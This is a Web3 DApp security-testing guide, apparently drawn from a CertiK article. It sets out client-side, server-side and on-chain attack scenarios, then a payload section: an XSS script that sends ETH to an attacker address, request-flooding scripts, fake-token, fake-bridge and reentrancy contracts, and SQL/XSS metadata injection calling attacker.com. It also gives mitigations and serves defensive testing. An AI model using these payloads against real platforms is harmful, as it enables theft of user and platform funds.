# ## 1. Overview & Architecture

### What is a DApp?

A **DApp (Decentralized Application)** runs on peer-to-peer networks rather than centralized servers, typically built on **blockchain technology** for transparency, security, and data immutability.

### Web3 DApp Architecture Types

**🔹 "API-less" DApps**

- **Fully decentralized** - blockchain acts as the backend
- Client interacts directly via **wallet** (signs transactions)
- May use a **node** to read blockchain data
- No centralized APIs or backend dependencies

**🔹 "API-Enabled" DApps**

- **Mostly decentralized** - core functionality on blockchain
- Relies on centralized APIs for information gathering
- Client communicates with blockchain through **wallet**
- **Example:** NFT minting platforms (server hosts images, client mints via wallet)

**🔹 "Full-Scale" DApps**

- **Partially decentralized** - mixed architecture
- Uses centralized APIs and backend servers
- **Both client and backend** can perform blockchain operations
- **Example:** Cross-chain bridges (offchain component communicates with multiple blockchain smart contracts)

---

## 2. Exploitation Methods

### 🎯 Attack Surface Categories

**Three primary vulnerability classes:**

1. **Mishandled On-Chain Transactions**
2. **Smart-Contract-Driven Backend Attacks**
3. **Flawed Crypto-Asset Operations**

---

### A. Client-Side Exploitation

**⚡ Impact Amplification in Web3:**

Client-side vulnerabilities have **increased severity** because clients directly perform blockchain operations through wallets.

**Key Attack Vectors:**

**XSS (Cross-Site Scripting)**

- Execute malicious JavaScript in user context
- Tamper with page content to manipulate wallet interactions
- Trick users into signing malicious transactions

**Exploitation Steps:**

1. Identify XSS injection points (input fields, URL parameters, stored data)
2. Craft payload that interacts with Web3 wallet APIs
3. Manipulate transaction data displayed to user
4. Social engineer user to approve fraudulent transaction
5. Even though users can review transactions, altered page content can deceive them

**Testing Checklist:**

- [ ] Test all input fields for script injection
- [ ] Check URL parameters for reflected XSS
- [ ] Examine stored content (comments, profiles, NFT metadata)
- [ ] Test wallet interaction flows for manipulation points
- [ ] Verify transaction preview tampering possibilities

---

### B. Server-Side Exploitation

**Impact varies by DApp architecture but can be critical:**

**High-Value Targets:**

- **Company wallet private keys** stored in backend
- **User account credentials** for account takeover
- **Smart contract interaction endpoints**

**Common Vulnerabilities:**

- SQL Injection
- Authentication bypass
- API key exposure
- Insecure direct object references (IDOR)
- Server-Side Request Forgery (SSRF)

**Attack Flow:**

1. Enumerate backend endpoints and APIs
2. Test for traditional Web2 vulnerabilities
3. Search for exposed credentials/keys in:
    - Environment variables
    - Configuration files
    - Database backups
    - Git repositories
4. Compromise accounts to steal funds/NFTs
5. Extract company keys to drain smart contract funds

---

### C. Mishandled On-Chain Transactions

#### **Scenario 1: Wasting Funds via Unrestricted API**

**Vulnerability:** Backend performs gas-consuming transactions without rate limits or validation.

**Exploitation Steps:**

1. Identify API endpoints that trigger blockchain transactions
2. Send minimal required data (e.g., ETH address only)
3. Automate requests to repeatedly trigger transactions
4. Force backend to waste gas fees on useless operations

**Testing Checklist:**

- [ ] Find endpoints that trigger on-chain transactions
- [ ] Test for rate limiting
- [ ] Check for transaction validation logic
- [ ] Verify gas cost estimation and limits
- [ ] Attempt bulk transaction triggering

---

#### **Scenario 2: DoS via Poor Transaction Handling**

**Vulnerability:** Backend keeps HTTP connections open until blockchain transaction completes.

**Exploitation Steps:**

1. Identify endpoints that wait for transaction confirmation
2. Send multiple simultaneous requests
3. Exhaust backend resources (threads, connections, memory)
4. Achieve Denial of Service

**Testing Methodology:**

```bash
# Send concurrent requests
for i in {1..100}; do
  curl -X POST https://target-dapp.com/api/transaction \
    -H "Content-Type: application/json" \
    -d '{"address":"0x..."}' &
done
```

**Verification:**

- [ ] Monitor backend response times
- [ ] Check for connection timeouts
- [ ] Test concurrent request handling
- [ ] Observe resource exhaustion symptoms

---

#### **Scenario 3: Race Condition - Backend/Blockchain Desync**

**Vulnerability:** Backend updates user balance before blockchain transaction confirms.

**Real-World Example:** Game withdrawal system vulnerability.

**Exploitation Steps:**

1. Initiate withdrawal request (backend sends coins)
2. While transaction is pending, immediately use those coins to purchase in-game items
3. Backend grants items before blockchain confirms withdrawal
4. Result: Free items + received withdrawal

**Alternative Exploitation:**

- Use same coins for multiple purchases before balance updates
- Exploit optimistic balance updates

**Testing Steps:**

- [ ] Identify operations that update user balance
- [ ] Check if balance updates before transaction confirmation
- [ ] Test rapid sequential operations using same funds
- [ ] Monitor blockchain transaction status vs backend state
- [ ] Verify block confirmation logic exists

---

### D. Smart Contract Backend Attacks

#### **Scenario 4: Missing Smart Contract Address Validation**

**Vulnerability:** Backend fails to verify legitimate smart contract addresses.

**Real-World Example:** Bridge backend accepting fake contract addresses.

**Exploitation Steps:**

1. Deploy malicious smart contract mimicking legitimate one
2. Fund fake contract with minimal amount
3. Send transaction referencing fake contract to backend
4. Backend validates transaction without checking contract address
5. Backend credits attacker account as if real funds were deposited

**Testing Methodology:**

- [ ] Deploy test contract with same interface
- [ ] Submit transaction using fake contract address
- [ ] Verify backend validates contract address
- [ ] Test if backend checks contract bytecode/hash
- [ ] Attempt transaction replay attacks

---

### E. Flawed Crypto-Asset Operations

#### **Scenario 5: Mishandling Asset Classes**

**Vulnerability:** Backend confuses different token/asset types.

**Real-World Example:** Platform treating scam NFT as 1 MATIC token.

**Exploitation Steps:**

1. Identify platform's asset valuation logic
2. Send worthless assets (scam tokens, NFTs) to platform
3. Platform incorrectly values assets as legitimate currency
4. Receive actual cryptocurrency in exchange for worthless assets
5. Scale attack with multiple fake assets

**Common Mishandling Issues:**

- Confusing native tokens (ETH, MATIC) with ERC-20 tokens
- Ignoring token decimal precision
- Not validating token contract addresses
- Accepting deflationary/rebase tokens without adjustment
- Trusting token metadata without verification

**Testing Checklist:**

- [ ] Test with various token types (ERC-20, ERC-721, ERC-1155)
- [ ] Submit tokens with unusual decimals
- [ ] Send deflationary tokens
- [ ] Test rebase token handling
- [ ] Verify token contract whitelist exists
- [ ] Attempt metadata injection via fake tokens

---

### F. Transaction Data Injection

**Vulnerability:** Backend accepts and processes malicious calldata in transactions.

**Exploitation Vectors:**

- Inject malicious parameters in transaction data
- Exploit improperly formatted transaction APIs
- Bypass validation via internally-typed transactions
- Manipulate failed/reverted transaction handling

**Testing Approach:**

- [ ] Intercept transaction data before submission
- [ ] Modify calldata parameters
- [ ] Test boundary values and type confusion
- [ ] Submit intentionally failing transactions
- [ ] Verify proper error handling

---

## 3. Bypasses

### Transaction Validation Bypass

**Technique:** Exploit lack of block confirmation checks

**Bypass Method:**

1. Submit transaction to blockchain
2. Immediately interact with backend before confirmation
3. Backend processes unconfirmed transaction
4. Cancel or replace transaction if possible (pre-EIP-1559)

**Prevention Check:**

- Verify minimum block confirmations required
- Test if backend accepts pending transactions

---

### Rate Limiting Bypass

**Technique:** Use distributed requests or IP rotation

**Methods:**

- Rotate IP addresses via proxies/VPNs
- Use multiple accounts
- Leverage cloud services for distributed attacks
- Time requests to avoid detection thresholds

---

### Input Validation Bypass

**Technique:** Type confusion and unexpected formats

**Examples:**

- Send contract address where wallet address expected
- Use checksum vs non-checksum addresses
- Submit hex-encoded vs base64-encoded data
- Mix token standards (ERC-20 vs ERC-721)

---

## 4. Key Payloads

### 1. XSS Wallet Interaction Payload

```javascript
<script>
if(typeof ethereum !== 'undefined') {
  ethereum.request({
    method: 'eth_sendTransaction',
    params: [{
      to: '0xATTACKER_ADDRESS',
      from: ethereum.selectedAddress,
      value: '0xDE0B6B3A7640000' // 1 ETH
    }]
  }).catch(console.error);
}
</script>
```

---

### 2. Transaction Flooding Script

```python
import requests
import threading

def spam_transaction(target_url, count):
    for i in range(count):
        requests.post(
            f"{target_url}/api/transaction",
            json={"address": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"}
        )

threads = []
for i in range(50):
    t = threading.Thread(target=spam_transaction, args=("https://target.com", 100))
    threads.append(t)
    t.start()
```

---

### 3. Race Condition Exploit

```javascript
// Initiate withdrawal
fetch('/api/withdraw', {
  method: 'POST',
  body: JSON.stringify({amount: 1000})
});

// Immediately spend same funds
setTimeout(() => {
  fetch('/api/purchase', {
    method: 'POST',
    body: JSON.stringify({item_id: 123, amount: 1000})
  });
}, 100);
```

---

### 4. Fake Token Deployment

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FakeToken {
    string public name = "Legitimate Token";
    string public symbol = "LEGIT";
    
    function transfer(address to, uint256 amount) public returns (bool) {
        // Fake transfer - always returns true
        return true;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        // Always shows high balance
        return 1000000 * 10**18;
    }
}
```

---

### 5. Malicious Smart Contract for Bridge Attack

```solidity
contract FakeBridge {
    event Deposit(address indexed user, uint256 amount);
    
    function deposit() public payable {
        // Emit event that backend monitors
        emit Deposit(msg.sender, msg.value);
    }
    
    // Allows attacker to withdraw funds
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

---

### 6. Token Metadata Injection

```javascript
{
  "name": "<script>alert('XSS')</script>Malicious NFT",
  "description": "'; DROP TABLE users; --",
  "image": "https://attacker.com/tracker.php?user=",
  "attributes": [
    {
      "trait_type": "payload",
      "value": "{{7*7}}" // Template injection attempt
    }
  ]
}
```

---

### 7. Deflationary Token Abuse

```solidity
// Token that takes 10% fee on transfers
contract DeflationaryToken {
    mapping(address => uint256) public balanceOf;
    
    function transfer(address to, uint256 amount) public returns (bool) {
        uint256 fee = amount / 10;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount - fee;
        // Backend expects full amount but receives less
        return true;
    }
}
```

---

### 8. Reentrancy Payload for Backend Contract

```solidity
contract ReentrancyAttack {
    address public targetContract;
    
    function attack() public {
        TargetContract(targetContract).withdraw();
    }
    
    receive() external payable {
        if (address(targetContract).balance >= 1 ether) {
            TargetContract(targetContract).withdraw();
        }
    }
}
```

---

### 9. Gas Exhaustion Payload

```javascript
// Submit transaction with extremely high gas limit
const tx = {
  to: contractAddress,
  data: '0x' + 'ff'.repeat(10000), // Large calldata
  gas: 10000000
};

await backend.post('/execute', {transaction: tx});
```

---

### 10. Event Poisoning Attack

```solidity
contract EventPoison {
    // Emit fake events that backend monitors
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    function poisonBackend(address legitimateContract) public {
        // Emit events as if from legitimate contract
        emit Transfer(address(this), msg.sender, 1000000 * 10**18);
    }
}
```

---

## 5. Higher Impact Scenarios

### 🔥 Critical Impact Chains

**Scenario 1: Complete Platform Drain**

1. Exploit XSS to steal admin session
2. Access backend admin panel
3. Extract company wallet private keys
4. Drain all smart contract funds
5. **Impact:** Total loss of platform reserves

---

**Scenario 2: Mass User Account Compromise**

1. Find IDOR vulnerability in user API
2. Enumerate all user accounts
3. Extract wallet addresses and session tokens
4. Phish users with targeted attacks using real data
5. Steal NFTs and tokens from multiple users
6. **Impact:** Loss of user trust, regulatory issues, platform shutdown

---

**Scenario 3: Bridge Protocol Exploitation**

1. Deploy fake smart contract on secondary chain
2. Lock minimal funds in fake contract
3. Submit proof to bridge backend
4. Backend validates fake contract as legitimate
5. Receive full value on primary chain
6. Repeat until bridge is drained
7. **Impact:** Complete bridge insolvency, multi-chain ecosystem damage

---

**Scenario 4: Gaming Economy Collapse**

1. Exploit race condition in item purchase system
2. Generate unlimited in-game currency
3. Purchase all rare items with duplicated funds
4. Flood marketplace with rare items
5. Crash in-game economy
6. **Impact:** Game becomes unplayable, user exodus

---

**Scenario 5: NFT Platform Manipulation**

1. Upload malicious NFT metadata with XSS payload
2. Payload executes when users view NFT
3. Steal wallet signatures for marketplace approvals
4. Transfer all user NFTs to attacker
5. List stolen NFTs on external marketplaces
6. **Impact:** Massive theft, platform reputation destroyed

---

## 6. Mitigations

### 🛡️ Defense Strategies

### Client-Side Protection

**Input Sanitization**

- Implement strict Content Security Policy (CSP)
- Sanitize all user-generated content
- Use DOMPurify or similar libraries
- Escape special characters in outputs

**Wallet Interaction Security**

- Display clear transaction details before signing
- Implement transaction simulation/preview
- Show decoded function calls and parameters
- Verify contract addresses in UI

**Implementation:**

```javascript
// Example CSP header
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';

// Transaction preview
const previewTransaction = async (tx) => {
  const decoded = await decodeTransaction(tx);
  return {
    function: decoded.functionName,
    parameters: decoded.params,
    estimatedGas: await estimateGas(tx),
    value: ethers.utils.formatEther(tx.value)
  };
};
```

---

### Server-Side Protection

**Authentication & Authorization**

- Implement robust session management
- Use multi-factor authentication (MFA)
- Apply principle of least privilege
- Rotate API keys regularly

**Transaction Validation**

- Wait for minimum block confirmations (6+ for high value)
- Validate all transaction parameters
- Implement rate limiting per user/IP
- Use nonce tracking to prevent replays

**Implementation:**

```python
# Example confirmation check
def wait_for_confirmation(tx_hash, min_confirmations=6):
    while True:
        receipt = web3.eth.get_transaction_receipt(tx_hash)
        if receipt:
            current_block = web3.eth.block_number
            confirmations = current_block - receipt['blockNumber']
            if confirmations >= min_confirmations:
                return True
        time.sleep(15)
```

---

### Smart Contract Validation

**Address Verification**

- Maintain whitelist of legitimate contract addresses
- Verify contract bytecode matches expected hash
- Check contract deployment block number
- Validate contract interface implementation

**Implementation:**

```javascript
const LEGITIMATE_CONTRACTS = {
  'mainnet': '0x...',
  'polygon': '0x...'
};

function validateContract(address, network) {
  if (address.toLowerCase() !== LEGITIMATE_CONTRACTS[network].toLowerCase()) {
    throw new Error('Invalid contract address');
  }
  
  // Verify bytecode
  const bytecode = await web3.eth.getCode(address);
  const expectedHash = sha256(EXPECTED_BYTECODE);
  if (sha256(bytecode) !== expectedHash) {
    throw new Error('Contract bytecode mismatch');
  }
}
```

---

### Asset Handling Best Practices

**Token Validation**

- Whitelist approved token contracts
- Verify token decimal places
- Check for deflationary/rebase mechanisms
- Validate actual received amounts vs expected

**Implementation:**

```solidity
contract SecureTokenHandler {
    mapping(address => bool) public approvedTokens;
    
    function processDeposit(address token, uint256 expectedAmount) public {
        require(approvedTokens[token], "Token not approved");
        
        uint256 balanceBefore = IERC20(token).balanceOf(address(this));
        IERC20(token).transferFrom(msg.sender, address(this), expectedAmount);
        uint256 balanceAfter = IERC20(token).balanceOf(address(this));
        
        uint256 actualReceived = balanceAfter - balanceBefore;
        require(actualReceived >= expectedAmount, "Insufficient transfer");
    }
}
```

---

### Rate Limiting & DoS Prevention

**Backend Protection**

- Implement per-user transaction limits
- Use async job queues for blockchain operations
- Set timeout limits for pending transactions
- Monitor gas prices and adjust limits

**Implementation:**

```python
from redis import Redis
from time import time

redis = Redis()

def rate_limit(user_id, limit=10, window=3600):
    key = f"rate_limit:{user_id}"
    current = redis.get(key)
    
    if current and int(current) >= limit:
        raise Exception("Rate limit exceeded")
    
    redis.incr(key)
    redis.expire(key, window)
```

---

### Monitoring & Alerting

**Real-Time Detection**

- Monitor unusual transaction patterns
- Alert on rapid sequential operations
- Track failed transaction rates
- Log all smart contract interactions

**Key Metrics:**

- Transaction confirmation times
- Gas consumption patterns
- Failed transaction rate
- User balance changes
- API error rates

---

### Security Checklist

**Pre-Deployment:**

- [ ] Smart contract audit completed
- [ ] Penetration testing performed
- [ ] Rate limiting implemented
- [ ] Transaction confirmation logic verified
- [ ] Input validation on all endpoints
- [ ] CSP headers configured
- [ ] Wallet interaction flows reviewed
- [ ] Error handling tested
- [ ] Monitoring dashboards configured

**Ongoing:**

- [ ] Regular security audits
- [ ] Dependency updates
- [ ] Incident response plan tested
- [ ] Bug bounty program active
- [ ] Security training for developers

---

## References

- [CertiK: Web2 Meets Web3 - Hacking Decentralized Applications](https://www.certik.com/resources/blog/web2-meets-web3-hacking-decentralized-applications)

---

**💪 Pro Tip:** Web3 security requires mastering both traditional Web2 vulnerabilities AND blockchain-specific attack vectors. Start with one architecture type, master its weaknesses, then expand. Every vulnerability you find makes the entire ecosystem safer! 🚀